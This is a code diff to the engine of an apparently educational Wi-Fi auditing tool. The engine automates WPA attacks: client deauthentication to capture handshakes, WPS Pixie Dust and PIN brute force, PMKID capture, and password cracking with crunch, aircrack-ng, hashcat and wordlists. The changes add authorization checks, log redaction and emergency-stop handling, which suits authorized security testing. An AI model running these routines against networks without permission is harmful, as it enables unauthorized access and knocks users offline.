@@ -15,9 +15,11 @@ import os
 import re
 import signal
 import subprocess
+import threading
 import time
 from datetime import datetime
 from pathlib import Path
+from uuid import uuid4
 
 WORKDIR = Path(__file__).resolve().parent.parent  # .../wifi-auditor/
 LOGFILE = WORKDIR / "auditoria_gui.log"
@@ -59,9 +61,11 @@ class Engine:
 
     def __init__(self, log_cb):
         self.log_cb = log_cb
+        self.session_id = uuid4().hex[:12]
         self.iface = None
         self.moniface = None
         self.monitor_ativo = False
+        self.rede_interrompida = False
         self.alvos = []          # lista de dicts do último scan
         self.target = {}         # alvo escolhido: essid/bssid/ch/enc/freq
         self.senha = None
@@ -69,15 +73,21 @@ class Engine:
         self.rota_usada = None
         self.ip_roteador = None
         self.autorizado = False
+        self.autorizado_bssid = None
         self._parar = False      # flag de parada de emergência (botão do painel)
         self._airodump_proc = None
+        self._capture_path = None
+        self._capture_bssid = None
+        self.deauth_estado = "nao_solicitado"
+        self._processos = set()
+        self._processos_lock = threading.RLock()
 
     # ------------------------------------------------------------------
     # util
     # ------------------------------------------------------------------
 
     def log(self, msg):
-        linha = f"[{_agora()}] {msg}"
+        linha = f"[{_agora()}][sessão:{self.session_id}] {msg}"
         try:
             with open(LOGFILE, "a") as f:
                 f.write(linha + "\n")
@@ -88,33 +98,138 @@ class Engine:
     def pedir_parada(self):
         """Chamado pelo endpoint /api/stop (botão de emergência no painel)."""
         self._parar = True
+        with self._processos_lock:
+            processos = list(self._processos)
+        for proc in processos:
+            self._encerrar_processo(proc)
+
+    def iniciar_operacao(self):
+        """Limpa exclusivamente a solicitação de parada de uma operação anterior."""
+        self._parar = False
 
     def _checar_parada(self):
         if self._parar:
             raise AttackAborted("Parada solicitada pelo usuário no painel.")
 
-    def run(self, cmd, timeout=None, input_text=None):
-        """Roda um comando e loga a chamada + saída. Usa o timeout nativo do
-        subprocess, que já mata o processo (SIGKILL) se estourar — não sofre
-        do bug do `timeout` do bash sem --kill-after."""
-        self.log("$ " + " ".join(str(c) for c in cmd))
+    def _registrar_processo(self, proc):
+        with self._processos_lock:
+            self._processos.add(proc)
+
+    def _desregistrar_processo(self, proc):
+        with self._processos_lock:
+            self._processos.discard(proc)
+
+    def _sleep_interruptivel(self, segundos):
+        fim = time.monotonic() + segundos
+        while time.monotonic() < fim:
+            self._checar_parada()
+            time.sleep(min(0.25, max(0, fim - time.monotonic())))
+
+    def run(self, cmd, timeout=None, input_text=None, cancelavel=True, ocultar=()):
+        """Executa e supervisiona um subprocesso.
+
+        Processos canceláveis são registrados para que o botão de parada os
+        encerre antes de restaurar a interface. ``ocultar`` redige segredos do
+        comando no log, sem alterar os argumentos efetivamente executados.
+        """
+        if cancelavel:
+            self._checar_parada()
+        exibicao = " ".join(str(c) for c in cmd)
+        for segredo in ocultar:
+            if segredo:
+                exibicao = exibicao.replace(str(segredo), "<redigido>")
+        self.log("$ " + exibicao)
+        proc = subprocess.Popen(
+            cmd,
+            stdin=subprocess.PIPE if input_text is not None else None,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True,
+            start_new_session=True,
+        )
+        self._registrar_processo(proc)
+        inicio = time.monotonic()
+        entrada = input_text
         try:
-            r = subprocess.run(
-                cmd, capture_output=True, text=True, timeout=timeout, input=input_text
-            )
-        except subprocess.TimeoutExpired as e:
-            self.log(f"(comando interrompido após {timeout}s)")
-            out = (e.stdout or "") if isinstance(e.stdout, str) else ""
-            err = (e.stderr or "") if isinstance(e.stderr, str) else ""
-            return subprocess.CompletedProcess(cmd, 124, out, err)
-        for stream in (r.stdout, r.stderr):
+            while True:
+                if cancelavel and self._parar:
+                    self._encerrar_processo(proc)
+                    raise AttackAborted("Parada solicitada pelo usuário no painel.")
+                if timeout is not None and time.monotonic() - inicio >= timeout:
+                    self._encerrar_processo(proc)
+                    out, err = proc.communicate()
+                    self.log(f"(comando interrompido após {timeout}s)")
+                    return subprocess.CompletedProcess(cmd, 124, out or "", err or "")
+                try:
+                    out, err = proc.communicate(input=entrada, timeout=0.25)
+                    break
+                except subprocess.TimeoutExpired:
+                    entrada = None
+        finally:
+            self._desregistrar_processo(proc)
+
+        if cancelavel and self._parar:
+            raise AttackAborted("Parada solicitada pelo usuário no painel.")
+
+        for stream in (out, err):
             if stream:
                 try:
                     with open(LOGFILE, "a") as f:
                         f.write(stream)
                 except OSError:
                     pass
-        return r
+        return subprocess.CompletedProcess(cmd, proc.returncode, out or "", err or "")
+
+    def _run_pipeline(self, produtor_cmd, consumidor_cmd, timeout=None):
+        """Executa produtor | consumidor mantendo ambos canceláveis."""
+        self.log(
+            "$ " + " ".join(map(str, produtor_cmd)) + " | "
+            + " ".join(map(str, consumidor_cmd))
+        )
+        produtor = subprocess.Popen(
+            produtor_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+            start_new_session=True,
+        )
+        consumidor = subprocess.Popen(
+            consumidor_cmd,
+            stdin=produtor.stdout,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True,
+            start_new_session=True,
+        )
+        produtor.stdout.close()
+        self._registrar_processo(produtor)
+        self._registrar_processo(consumidor)
+        inicio = time.monotonic()
+        try:
+            while True:
+                self._checar_parada()
+                if timeout is not None and time.monotonic() - inicio >= timeout:
+                    self._encerrar_processo(consumidor)
+                    self._encerrar_processo(produtor)
+                    return subprocess.CompletedProcess(consumidor_cmd, 124, "", "timeout")
+                try:
+                    out, err = consumidor.communicate(timeout=0.25)
+                    break
+                except subprocess.TimeoutExpired:
+                    continue
+            self._encerrar_processo(produtor)
+            produtor_err = produtor.stderr.read().decode(errors="replace")
+            if produtor_err:
+                with open(LOGFILE, "a") as f:
+                    f.write(produtor_err)
+            if err:
+                with open(LOGFILE, "a") as f:
+                    f.write(err)
+            return subprocess.CompletedProcess(
+                consumidor_cmd, consumidor.returncode, out or "", err or ""
+            )
+        finally:
+            self._encerrar_processo(consumidor)
+            self._encerrar_processo(produtor)
+            self._desregistrar_processo(consumidor)
+            self._desregistrar_processo(produtor)
 
     # ------------------------------------------------------------------
     # 1. dependências / wordlist
@@ -181,7 +296,10 @@ class Engine:
         return interfaces
 
     def entrar_modo_monitor(self, iface):
+        if not iface or iface not in self._listar_interfaces():
+            raise RuntimeError("Interface WiFi inválida ou indisponível.")
         self.iface = iface
+        self.rede_interrompida = True
         self.log("Ajustando região regulatória para BR...")
         self.run(["iw", "reg", "set", "BR"], timeout=10)
 
@@ -231,76 +349,156 @@ class Engine:
         return self.moniface
 
     def garantir_moniface_viva(self):
+        if not self.moniface or not self.iface:
+            raise RuntimeError("Modo monitor ainda não foi preparado.")
         r = subprocess.run(["iw", "dev", self.moniface, "info"], capture_output=True)
         if r.returncode != 0:
             self.log(f"Interface {self.moniface} sumiu. Recriando modo monitor...")
             self.entrar_modo_monitor(self.iface)
 
-    def restaurar_modo_gerenciado(self):
+    def restaurar_modo_gerenciado(self, forcar=False):
+        if not self.monitor_ativo and not self.rede_interrompida and not forcar:
+            self.log("Interface já está em modo gerenciado; restauração dispensada.")
+            return
         if self.moniface:
             r = subprocess.run(["iw", "dev", self.moniface, "info"], capture_output=True)
             if r.returncode == 0:
                 self.log(f"Parando modo monitor em {self.moniface}...")
-                self.run(["airmon-ng", "stop", self.moniface], timeout=15)
+                self.run(["airmon-ng", "stop", self.moniface], timeout=15, cancelavel=False)
         self.log("Religando NetworkManager...")
-        self.run(["systemctl", "restart", "NetworkManager"], timeout=15)
+        r = self.run(
+            ["systemctl", "restart", "NetworkManager"], timeout=15, cancelavel=False
+        )
+        if r.returncode != 0:
+            self.run(
+                ["service", "network-manager", "restart"], timeout=15, cancelavel=False
+            )
         time.sleep(2)
         self.monitor_ativo = False
+        self.rede_interrompida = False
+        self.moniface = None
 
     # ------------------------------------------------------------------
     # 3. scan e escolha do alvo
     # ------------------------------------------------------------------
 
-    def escanear(self, duracao=15):
-        self.garantir_moniface_viva()
-        self.log(f"Escaneando redes nas bandas a/b/g por {duracao}s...")
-
-        for p in WORKDIR.glob(SCAN_PREFIX.name + "*"):
-            p.unlink(missing_ok=True)
-
-        try:
-            subprocess.run(
-                [
-                    "airodump-ng", "--band", "abg",
-                    "--write", str(SCAN_PREFIX), "--output-format", "csv",
-                    self.moniface,
-                ],
-                timeout=duracao, capture_output=True, text=True,
-            )
-        except subprocess.TimeoutExpired:
-            pass  # esperado: airodump roda indefinidamente, o timeout é o que o encerra
-
-        csv_path = Path(f"{SCAN_PREFIX}-01.csv")
-        if not csv_path.exists():
-            raise RuntimeError(f"Arquivo de scan não foi gerado ({csv_path}).")
-
-        texto = csv_path.read_text(errors="replace")
-        secao_aps = texto.split("Station MAC")[0]
+    @staticmethod
+    def _parsear_scan_csv(texto):
+        secao_aps = texto.split("Station MAC", 1)[0]
         linhas = list(csv.reader(io.StringIO(secao_aps)))
-
         aps = []
+        rejeitadas = 0
         for campos in linhas:
-            if len(campos) < 14:
+            if not campos or not campos[0].strip():
                 continue
             bssid = campos[0].strip()
-            if not re.match(r"^[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}$", bssid):
+            if len(campos) < 14 or not re.fullmatch(
+                r"[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}", bssid
+            ):
+                # Cabeçalhos não contam como AP rejeitado.
+                if bssid.lower() != "bssid":
+                    rejeitadas += 1
                 continue
             ch = campos[3].strip()
             privacidade = campos[5].strip()
             power = campos[8].strip() or "-100"
             essid = campos[-2].strip() or "<oculto>"
             aps.append({
-                "bssid": bssid, "ch": ch, "enc": privacidade,
+                "bssid": bssid,
+                "ch": ch,
+                "enc": privacidade,
                 "pwr": int(power) if power.lstrip("-").isdigit() else -100,
                 "essid": essid,
             })
-
         aps.sort(key=lambda a: a["pwr"], reverse=True)
+        return aps, rejeitadas
+
+    @staticmethod
+    def _arquivo_mais_recente(padrao):
+        arquivos = [
+            p for p in WORKDIR.glob(padrao)
+            if p.is_file() and not p.name.endswith((".kismet.csv", ".log.csv"))
+        ]
+        return max(arquivos, key=os.path.getmtime) if arquivos else None
+
+    def escanear(self, duracao=15):
+        self.session_id = uuid4().hex[:12]
+        # Um novo scan inicia um novo contexto de seleção. Resultados e
+        # autorização do alvo anterior não podem atravessar essa fronteira.
+        self.target = {}
+        self.autorizado = False
+        self.autorizado_bssid = None
+        self.senha = None
+        self.rota_usada = None
+        self.ip_roteador = None
+        self._mask = None
+        self._capture_path = None
+        self._capture_bssid = None
+        self.deauth_estado = "nao_solicitado"
+        self.garantir_moniface_viva()
+        scan_id = uuid4().hex[:8]
+        self.log(
+            f"scan_id={scan_id} início; fonte=airodump-ng; interface={self.moniface}; "
+            f"bandas=abg; duração={duracao}s"
+        )
+
+        for p in WORKDIR.glob(SCAN_PREFIX.name + "*"):
+            p.unlink(missing_ok=True)
+
+        erro_scan = WORKDIR / "scan_gui.stderr.log"
+        erro_scan.unlink(missing_ok=True)
+        with open(erro_scan, "w") as stderr:
+            proc = subprocess.Popen(
+                [
+                    "airodump-ng", "--band", "abg", "--write-interval", "1",
+                    "--write", str(SCAN_PREFIX), "--output-format", "csv",
+                    self.moniface,
+                ],
+                stdout=subprocess.DEVNULL,
+                stderr=stderr,
+                start_new_session=True,
+            )
+            self._registrar_processo(proc)
+            inicio = time.monotonic()
+            terminou_antes = False
+            try:
+                while time.monotonic() - inicio < duracao:
+                    self._checar_parada()
+                    if proc.poll() is not None:
+                        terminou_antes = True
+                        break
+                    time.sleep(0.25)
+            finally:
+                self._encerrar_processo(proc)
+                self._desregistrar_processo(proc)
+
+        if terminou_antes and proc.returncode not in (0, -signal.SIGTERM):
+            detalhe = erro_scan.read_text(errors="replace")[-1000:]
+            raise RuntimeError(
+                f"O processo de scan terminou antes do prazo (rc={proc.returncode}). {detalhe}"
+            )
+
+        csv_path = self._arquivo_mais_recente(f"{SCAN_PREFIX.name}-[0-9]*.csv")
+        if not csv_path:
+            detalhe = erro_scan.read_text(errors="replace")[-1000:]
+            raise RuntimeError(f"Arquivo de scan não foi gerado. {detalhe}")
+
+        texto = csv_path.read_text(errors="replace")
+        aps, rejeitadas = self._parsear_scan_csv(texto)
+        if not aps:
+            raise RuntimeError(
+                f"Nenhum AP válido encontrado; linhas rejeitadas={rejeitadas}; arquivo={csv_path.name}."
+            )
         self.alvos = aps
-        self.log(f"{len(aps)} redes encontradas.")
+        self.log(
+            f"scan_id={scan_id} fim; arquivo={csv_path.name}; "
+            f"aceitas={len(aps)}; rejeitadas={rejeitadas}"
+        )
         return aps
 
     def escolher_alvo(self, idx):
+        if not isinstance(idx, int) or idx < 0 or idx >= len(self.alvos):
+            raise ValueError("Índice de alvo inválido.")
         alvo = self.alvos[idx]
         ch = int(alvo["ch"]) if alvo["ch"].isdigit() else 0
         freq_label = "5 GHz" if ch >= 36 else "2.4 GHz"
@@ -308,6 +506,16 @@ class Engine:
             "essid": alvo["essid"], "bssid": alvo["bssid"],
             "ch": alvo["ch"], "enc": alvo["enc"], "freq_label": freq_label,
         }
+        # A autorização pertence ao BSSID, não à instância permanente do Engine.
+        self.autorizado = False
+        self.autorizado_bssid = None
+        self.senha = None
+        self.rota_usada = None
+        self.ip_roteador = None
+        self._mask = None
+        self._capture_path = None
+        self._capture_bssid = None
+        self.deauth_estado = "nao_solicitado"
         self.log(
             f"Alvo escolhido: ESSID={self.target['essid']} BSSID={self.target['bssid']} "
             f"CH={self.target['ch']} ENC={self.target['enc']} ({freq_label})"
@@ -315,37 +523,86 @@ class Engine:
         return self.target
 
     def autorizar(self, confirmado):
-        self.autorizado = bool(confirmado)
+        if not self.target.get("bssid"):
+            raise RuntimeError("Selecione um alvo antes de autorizar.")
+        self.autorizado = confirmado is True
+        self.autorizado_bssid = self.target["bssid"] if self.autorizado else None
         if self.autorizado:
             self.log(f"Autorização confirmada pelo usuário para o alvo {self.target.get('bssid')}.")
         else:
             self.log("Autorização NÃO confirmada.")
         return self.autorizado
 
+    def autorizacao_valida(self):
+        return bool(
+            self.autorizado
+            and self.autorizado_bssid
+            and self.autorizado_bssid == self.target.get("bssid")
+        )
+
+    def iniciar_tentativa(self):
+        """Inicia uma tentativa limpa para o alvo já autorizado.
+
+        Isto é necessário mesmo quando o BSSID não mudou: uma senha ou
+        handshake da execução anterior não pode ser reaproveitado depois de o
+        AP ter sua credencial alterada entre duas solicitações do professor.
+        """
+        if not self.autorizacao_valida():
+            raise RuntimeError("A autorização não corresponde ao BSSID selecionado.")
+        self.session_id = uuid4().hex[:12]
+        self.senha = None
+        self.rota_usada = None
+        self.ip_roteador = None
+        self._mask = None
+        self._capture_path = None
+        self._capture_bssid = None
+        self.deauth_estado = "nao_solicitado"
+        self.log(f"Nova tentativa iniciada para o BSSID {self.target['bssid']}.")
+
     # ------------------------------------------------------------------
     # 4. detecção de cliente conectado
     # ------------------------------------------------------------------
 
-    def ha_cliente_conectado(self):
-        csv_path = Path(f"{CAPTURE_PREFIX}-01.csv")
-        if not csv_path.exists():
+    def _ultimo_csv_captura(self):
+        arquivos = [
+            p for p in WORKDIR.glob(f"{CAPTURE_PREFIX.name}-[0-9]*.csv")
+            if not p.name.endswith((".kismet.csv", ".log.csv"))
+        ]
+        return max(arquivos, key=os.path.getmtime) if arquivos else None
+
+    def ha_cliente_conectado(self, max_idade=20):
+        csv_path = self._ultimo_csv_captura()
+        if not csv_path:
             return False
         texto = csv_path.read_text(errors="replace")
         if "Station MAC" not in texto:
             return False
         secao = texto.split("Station MAC", 1)[1]
-        return self.target.get("bssid", "").lower() in secao.lower()
+        alvo = self.target.get("bssid", "").lower()
+        for campos in csv.reader(io.StringIO(secao)):
+            if len(campos) < 6 or campos[5].strip().lower() != alvo:
+                continue
+            visto = campos[2].strip()
+            try:
+                idade = (datetime.now() - datetime.strptime(visto, "%Y-%m-%d %H:%M:%S")).total_seconds()
+            except ValueError:
+                continue
+            if -2 <= idade <= max_idade:
+                return True
+        return False
 
     def _ultimo_cap(self):
         caps = sorted(WORKDIR.glob(f"{CAPTURE_PREFIX.name}*.cap"), key=os.path.getmtime, reverse=True)
         return caps[0] if caps else None
 
     def _tem_handshake(self, capfile):
-        if not capfile:
+        if not capfile or not Path(capfile).exists() or not self.target.get("bssid"):
             return False
-        r = subprocess.run(["aircrack-ng", str(capfile)], capture_output=True, text=True)
-        # aircrack-ng mostra "1 handshake", "2 handshakes", etc. — casar qualquer número.
-        return bool(re.search(r"\d+ handshake", r.stdout.lower()))
+        r = self.run(
+            ["aircrack-ng", "-b", self.target["bssid"], str(capfile)], timeout=20
+        )
+        saida = ((r.stdout or "") + (r.stderr or "")).lower()
+        return bool(re.search(r"\b[1-9]\d* handshakes?\b", saida))
 
     # ------------------------------------------------------------------
     # 5. captura de handshake (unificada: já conectado OU vai conectar agora)
@@ -353,35 +610,61 @@ class Engine:
 
     def capturar_handshake(self, max_tentativas=12, intervalo=10):
         self.garantir_moniface_viva()
+        if (
+            self._capture_path
+            and self._capture_bssid == self.target.get("bssid")
+            and self._tem_handshake(self._capture_path)
+        ):
+            self.log(f"Reutilizando handshake já validado: {Path(self._capture_path).name}.")
+            return True
         self.log(f"Iniciando captura de handshake em {self.target['bssid']} (canal {self.target['ch']})...")
 
         for p in WORKDIR.glob(f"{CAPTURE_PREFIX.name}*"):
             p.unlink(missing_ok=True)
 
-        proc = subprocess.Popen(
-            ["airodump-ng", "--bssid", self.target["bssid"], "-c", str(self.target["ch"]),
-             "--write", str(CAPTURE_PREFIX), self.moniface],
-            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
-        )
-        self._airodump_proc = proc
+        captura_err = WORKDIR / "captura_gui_airodump.stderr.log"
+        captura_err.unlink(missing_ok=True)
+        handshake_ok = False
+        with open(captura_err, "w") as stderr:
+            proc = subprocess.Popen(
+                ["airodump-ng", "--bssid", self.target["bssid"], "-c", str(self.target["ch"]),
+                 "--write-interval", "1", "--write", str(CAPTURE_PREFIX), self.moniface],
+                stdout=subprocess.DEVNULL, stderr=stderr, start_new_session=True,
+            )
+            self._airodump_proc = proc
+            self._registrar_processo(proc)
+            try:
+                for tentativa in range(1, max_tentativas + 1):
+                    self._sleep_interruptivel(intervalo)
+                    if proc.poll() is not None:
+                        detalhe = captura_err.read_text(errors="replace")[-1000:]
+                        raise RuntimeError(
+                            f"Captura terminou inesperadamente (rc={proc.returncode}). {detalhe}"
+                        )
 
-        try:
-            handshake_ok = False
-            for tentativa in range(1, max_tentativas + 1):
-                self._checar_parada()
-                time.sleep(intervalo)
+                    cap_atual = self._ultimo_cap()
+                    if self._tem_handshake(cap_atual):
+                        handshake_ok = True
+                        self._capture_path = cap_atual
+                        self._capture_bssid = self.target["bssid"]
+                        break
 
-                if self._tem_handshake(self._ultimo_cap()):
-                    handshake_ok = True
-                    break
+                    if self.ha_cliente_conectado():
+                        self.log(f"Tentativa {tentativa}: cliente associado recentemente detectado.")
+                        self._executar_deauth_diagnostico()
+                    else:
+                        self.log(f"Tentativa {tentativa}: nenhum cliente recente detectado; aguardando conexão.")
+            finally:
+                self._encerrar_processo(proc)
+                self._desregistrar_processo(proc)
+                self._airodump_proc = None
 
-                if self.ha_cliente_conectado():
-                    self.log(f"Tentativa {tentativa}: cliente conectado detectado — enviando deauth...")
-                    self.run(["aireplay-ng", "--deauth", "5", "-a", self.target["bssid"], self.moniface])
-                else:
-                    self.log(f"Tentativa {tentativa}: nenhum cliente conectado detectado ainda — aguardando conexão...")
-        finally:
-            self._encerrar_processo(proc)
+        if not handshake_ok:
+            cap_atual = self._ultimo_cap()
+            if self._tem_handshake(cap_atual):
+                handshake_ok = True
+                self._capture_path = cap_atual
+                self._capture_bssid = self.target["bssid"]
 
         if handshake_ok:
             self.log("Handshake capturado com sucesso.")
@@ -389,17 +672,42 @@ class Engine:
             self.log("Não foi possível capturar o handshake.")
         return handshake_ok
 
+    def _executar_deauth_diagnostico(self):
+        """Executa a tentativa já existente e registra somente seu estado real.
+
+        Retorno zero significa apenas que o comando terminou; a confirmação do
+        efeito continua sendo a recepção e validação posterior do handshake.
+        """
+        self.deauth_estado = "executando"
+        r = self.run(
+            ["aireplay-ng", "--deauth", "5", "-a", self.target["bssid"], self.moniface],
+            timeout=20,
+        )
+        if r.returncode == 0:
+            self.deauth_estado = "comando_concluido"
+            self.log("Deauthentication: comando concluído; efeito ainda não confirmado.")
+        else:
+            self.deauth_estado = "falhou"
+            self.log(f"Deauthentication: comando falhou (rc={r.returncode}).")
+        return r.returncode == 0
+
     def _encerrar_processo(self, proc):
         """Termina um processo em background com prazo (TERM -> espera -> KILL),
         igual ao auditor.sh — evita travar pra sempre esperando o processo morrer."""
-        if proc.poll() is not None:
+        if not proc or proc.poll() is not None:
             return
-        proc.terminate()
+        try:
+            os.killpg(proc.pid, signal.SIGTERM)
+        except (ProcessLookupError, PermissionError):
+            proc.terminate()
         for _ in range(5):
             if proc.poll() is not None:
                 return
             time.sleep(1)
-        proc.kill()
+        try:
+            os.killpg(proc.pid, signal.SIGKILL)
+        except (ProcessLookupError, PermissionError):
+            proc.kill()
         try:
             proc.wait(timeout=5)
         except subprocess.TimeoutExpired:
@@ -433,22 +741,17 @@ class Engine:
 
         cap = self._ultimo_cap()
         self.log(f"Rodando crunch + aircrack-ng com máscara '{mascara}'...")
-        crunch = subprocess.Popen(
+        aircrack = self._run_pipeline(
             ["crunch", str(tamanho), str(tamanho), "-t", mascara],
-            stdout=subprocess.PIPE,
-        )
-        aircrack = subprocess.run(
             ["aircrack-ng", "-w", "-", "-b", self.target["bssid"], str(cap)],
-            stdin=crunch.stdout, capture_output=True, text=True,
+            timeout=3600,
         )
-        crunch.stdout.close()
-        crunch.wait()
 
         m = re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", aircrack.stdout)
         if m:
             self.senha = m.group(1)
             self.rota_usada = "Máscara (crunch)"
-            self.log(f"Senha encontrada via máscara: {self.senha}")
+            self.log("Senha encontrada via máscara (valor redigido do log).")
             return True
 
         self.log("Máscara não encontrou a senha com os parâmetros informados.")
@@ -504,7 +807,7 @@ class Engine:
             if linhas:
                 self.senha = linhas[-1].split(":", 1)[-1]
                 self.rota_usada = "Máscara (hashcat -a 3)"
-                self.log(f"Senha encontrada via máscara hashcat: {self.senha}")
+                self.log("Senha encontrada via máscara hashcat (valor redigido do log).")
                 return True
 
         self.log("Máscara hashcat não encontrou a senha com os parâmetros informados.")
@@ -522,33 +825,36 @@ class Engine:
         self.log("AP com WPS ativo. Tentando Pixie Dust...")
 
         log_path = WORKDIR / "reaver_pixie_gui.log"
-        proc = subprocess.Popen(
-            ["timeout", "90", "reaver", "-i", self.moniface, "-b", self.target["bssid"],
-             "-c", str(self.target["ch"]), "-K", "1", "-vv"],
-            stdout=open(log_path, "w"), stderr=subprocess.STDOUT,
-        )
         chegou_m1 = False
         inicio = time.time()
-        while proc.poll() is None:
-            self._checar_parada()
-            time.sleep(3)
-            texto = log_path.read_text(errors="replace")
-            if "received m1 message" in texto.lower():
-                chegou_m1 = True
-            if "wps pin:" in texto.lower() or "pin cracked" in texto.lower():
-                break
-            if not chegou_m1 and time.time() - inicio >= 90:
-                self.log("Loop de falha detectado sem receber M1 em 90s. Abortando rota WPS.")
-                proc.terminate()
-                break
-        self._encerrar_processo(proc)
+        with open(log_path, "w") as reaver_saida:
+            proc = subprocess.Popen(
+                ["timeout", "90", "reaver", "-i", self.moniface, "-b", self.target["bssid"],
+                 "-c", str(self.target["ch"]), "-K", "1", "-vv"],
+                stdout=reaver_saida, stderr=subprocess.STDOUT, start_new_session=True,
+            )
+            self._registrar_processo(proc)
+            try:
+                while proc.poll() is None:
+                    self._sleep_interruptivel(1)
+                    texto = log_path.read_text(errors="replace")
+                    if "received m1 message" in texto.lower():
+                        chegou_m1 = True
+                    if "wps pin:" in texto.lower() or "pin cracked" in texto.lower():
+                        break
+                    if not chegou_m1 and time.time() - inicio >= 90:
+                        self.log("Loop de falha detectado sem receber M1 em 90s. Abortando rota WPS.")
+                        break
+            finally:
+                self._encerrar_processo(proc)
+                self._desregistrar_processo(proc)
 
         texto = log_path.read_text(errors="replace")
         m = re.search(r"WPA PSK:\s*'?([^'\n]*)'?", texto)
         if "wps pin:" in texto.lower() and m:
             self.senha = m.group(1).strip()
             self.rota_usada = "WPS (Pixie Dust)"
-            self.log(f"Senha encontrada via Pixie Dust: {self.senha}")
+            self.log("Senha encontrada via Pixie Dust (valor redigido do log).")
             return True
 
         if chegou_m1:
@@ -564,7 +870,7 @@ class Engine:
             if m2:
                 self.senha = m2.group(1).strip()
                 self.rota_usada = "WPS (brute PIN)"
-                self.log(f"Senha encontrada via brute de PIN: {self.senha}")
+                self.log("Senha encontrada via brute de PIN (valor redigido do log).")
                 return True
 
         self.log("Rota WPS não teve sucesso.")
@@ -614,13 +920,11 @@ class Engine:
                 if forcar:
                     base += ["--force"]
                 base += ["--potfile-disable", "-o", str(found)]
-                crunch = subprocess.Popen(
-                    ["crunch", str(tam), str(tam), "-t", m], stdout=subprocess.PIPE
+                return self._run_pipeline(
+                    ["crunch", str(tam), str(tam), "-t", m],
+                    base,
+                    timeout=3600,
                 )
-                r = subprocess.run(base, stdin=crunch.stdout, capture_output=True, text=True)
-                crunch.stdout.close()
-                crunch.wait()
-                return r
 
             r = _rodar_crunch(False)
             saida = (r.stdout or "") + (r.stderr or "")
@@ -655,7 +959,10 @@ class Engine:
         # monitor (link-layer 802.11/radiotap) — por isso isso roda ANTES
         # de sair do modo monitor do airmon-ng, logo abaixo.
         with open(bpf_file, "wb") as f:
-            r = subprocess.run(["tcpdump", "-i", self.moniface, filtro, "-ddd"], stdout=f, stderr=subprocess.PIPE)
+            r = subprocess.run(
+                ["tcpdump", "-i", self.moniface, filtro, "-ddd"],
+                stdout=f, stderr=subprocess.PIPE, timeout=20,
+            )
         if r.returncode != 0:
             self.log("Falha ao compilar filtro BPF para o PMKID. Pulando rota PMKID.")
             return False
@@ -667,8 +974,13 @@ class Engine:
         # modo monitor aqui, deixamos o hcxdumptool cuidar disso sozinho, e
         # recriamos o modo monitor depois pra seguir com as próximas rotas.
         self.log("Saindo do modo monitor do airmon-ng (hcxdumptool precisa da interface física crua)...")
-        self.run(["airmon-ng", "stop", self.moniface])
-        time.sleep(1)
+        r = self.run(["airmon-ng", "stop", self.moniface], timeout=20)
+        if r.returncode != 0:
+            self.log(f"Falha ao sair do modo monitor para PMKID (rc={r.returncode}).")
+            return False
+        self.monitor_ativo = False
+        self.moniface = None
+        self._sleep_interruptivel(1)
 
         # -c aceita canal (<=1000) ou frequência em MHz (>1000); usamos a
         # frequência pra não depender do sufixo de banda (convenção a/b é
@@ -683,13 +995,11 @@ class Engine:
             freq_mhz = 2407 + ch_int * 5
         self.log(f"Tentando capturar PMKID direto do roteador por 30s (canal {self.target['ch']}, {freq_mhz} MHz)...")
         try:
-            subprocess.run(
+            self.run(
                 ["hcxdumptool", "-i", self.iface, "-w", str(pmkid_cap),
                  f"--bpf={bpf_file}", "-c", str(freq_mhz)],
-                timeout=30, capture_output=True,
+                timeout=30,
             )
-        except subprocess.TimeoutExpired:
-            pass
         finally:
             # Sempre volta pro modo monitor via airmon-ng, mesmo se a rota
             # falhar — as próximas rotas (dicionário) dependem disso.
@@ -717,7 +1027,7 @@ class Engine:
             if senha:
                 self.senha = senha
                 self.rota_usada = "PMKID + máscara"
-                self.log(f"Senha encontrada via PMKID + máscara: {self.senha}")
+                self.log("Senha encontrada via PMKID + máscara (valor redigido do log).")
                 return True
             self.log("Máscara não quebrou o PMKID. Tentando rockyou...")
 
@@ -738,7 +1048,7 @@ class Engine:
             linha = found_file.read_text().strip().splitlines()[-1]
             self.senha = linha.split(":", 1)[-1]
             self.rota_usada = "PMKID (hcxdumptool + hashcat)"
-            self.log(f"Senha encontrada via PMKID: {self.senha}")
+            self.log("Senha encontrada via PMKID (valor redigido do log).")
             return True
 
         self.log("PMKID capturado mas senha não encontrada no dicionário. Rota D sem sucesso final.")
@@ -755,6 +1065,7 @@ class Engine:
             return False
 
         hashfile = WORKDIR / "hash_gui.hc22000"
+        hashfile.unlink(missing_ok=True)
         if _tool_existe("hcxpcapngtool"):
             self.log("Convertendo captura para formato hashcat (hc22000)...")
             self.run(["hcxpcapngtool", "-o", str(hashfile), str(cap)])
@@ -772,7 +1083,7 @@ class Engine:
                 linha = found_file.read_text().strip().splitlines()[-1]
                 self.senha = linha.split(":", 1)[-1]
                 self.rota_usada = "Dicionário (hashcat + best64)"
-                self.log(f"Senha encontrada via hashcat: {self.senha}")
+                self.log("Senha encontrada via hashcat (valor redigido do log).")
                 return True
             self.log("Hashcat não encontrou. Tentando fallback via aircrack-ng (CPU)...")
 
@@ -782,7 +1093,7 @@ class Engine:
         if m:
             self.senha = m.group(1)
             self.rota_usada = "Dicionário (aircrack-ng/rockyou)"
-            self.log(f"Senha encontrada via aircrack-ng: {self.senha}")
+            self.log("Senha encontrada via aircrack-ng (valor redigido do log).")
             return True
 
         # Wordlists extras colocadas em wordlists/ (ex.: senhas BR), além do rockyou.
@@ -802,14 +1113,14 @@ class Engine:
                     linha = found_file.read_text().strip().splitlines()[-1]
                     self.senha = linha.split(":", 1)[-1]
                     self.rota_usada = f"Dicionário ({wl.name} + best64)"
-                    self.log(f"Senha encontrada via hashcat (wordlist extra): {self.senha}")
+                    self.log("Senha encontrada via hashcat/wordlist extra (valor redigido do log).")
                     return True
             r2 = self.run(["aircrack-ng", "-w", str(wl), "-b", self.target["bssid"], str(cap)], timeout=1800)
             m2 = re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", r2.stdout)
             if m2:
                 self.senha = m2.group(1)
                 self.rota_usada = f"Dicionário ({wl.name})"
-                self.log(f"Senha encontrada via aircrack-ng (wordlist extra): {self.senha}")
